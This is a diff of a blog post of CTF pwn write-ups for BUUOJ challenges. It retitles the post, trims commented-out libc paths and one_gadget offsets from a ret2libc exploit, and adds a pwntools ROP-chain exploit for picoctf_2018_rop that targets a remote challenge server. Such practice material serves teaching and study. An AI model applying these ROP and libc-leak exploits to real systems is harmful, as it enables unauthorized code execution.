@@ -2,13 +2,13 @@
 toc: true
 classes: wide
 layout: single
-title:  "Buuoj PWN 题目冲分过程2（指俯冲）"
+title:  "Buuoj冲分过程（指俯冲）その２"
 date:   2021-01-03 12:10:38 +0800
 categories: 
   - pwn
 ---
 
-# Buuoj PWN 题目冲分过程2（指俯冲）
+# Buuoj冲分过程（指俯冲）その２
 
 
 ## Problems
@@ -117,9 +117,6 @@ filename = './level3_x64'
 # p = process(filename)
 p = remote('node3.buuoj.cn', 28216)
 elf = ELF(filename)
-# libc = ELF('/home/ubuntu/glibc-2.23/lib/libc-2.23.so')
-# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-# libc = ELF('./libc/jarvisOJ_level3_x64-libc-2.19.so')
 libc = ELF('./libc/ubuntu_16_x86_64_libc-2.23.so')
 
 pop_rdi_ret = 0x00000000004006b3
@@ -137,10 +134,6 @@ searcher.add_condition('write', write_address)
 
 
 base_address = write_address - libc.sym['write']
-# base_address = write_address - searcher.dump('write')
-
-# gadgets = [0x4527a, 0xf0364, 0xf1207, 0x45226]
-# gadgets = [0x4647c, 0xe5765, 0xe66bd, 0x46428]
 gadgets = [0x4526a, 0xf02a4, 0xf1147, 0x45216]
 
 one_gadget = gadgets[1] + base_address
@@ -204,3 +197,30 @@ heap_delete(2)
 
 p.interactive()
 ```
+
+### picoctf_2018_rop
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './picoctf_2018_rop'
+# p = process(filename)
+p = remote('node3.buuoj.cn', 28747)
+elf = ELF(filename)
+
+win1 = elf.sym['win_function1']
+win2 = elf.sym['win_function2']
+flag = elf.sym['flag']
+main = elf.sym['main']
+
+pop_ebx_ret = 0x0804840d
+payload = b'!'*0x18 + p32(0) + p32(win1) + p32(win2) + p32(pop_ebx_ret) + p32(0x0BAAAAAAD) + p32(flag) + p32(main) + p32(0x0DEADBAAD)
+
+p.sendlineafter(b'Enter your input> ', payload)
+p.interactive()
+```
+
+#### [V&N2020 公开赛]simpleHeap
+
+[传送门]({{ site.url }}/pwn/buuoj-pwn-heap-vn_pwn_simpleHeap/)
